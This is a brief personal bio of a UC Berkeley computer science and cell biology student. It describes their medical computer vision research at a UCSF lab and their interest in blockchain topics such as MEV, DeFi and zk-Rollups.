"I am a junior at UC Berkeley studying Computer Science and Molecular & Cell Biology. These fields of study combine two of my passions, Healthcare and AI. My primary interests lie in the field of Medical Computer Vision, which I am currently conducting research in at the Grinberg Lab at UCSF, as a research apprentice. While these are my main points of focus, I also have a great deal of interest in the Blockchain industry, especially in the MEV, DeFi and zk-Rollups spaces.
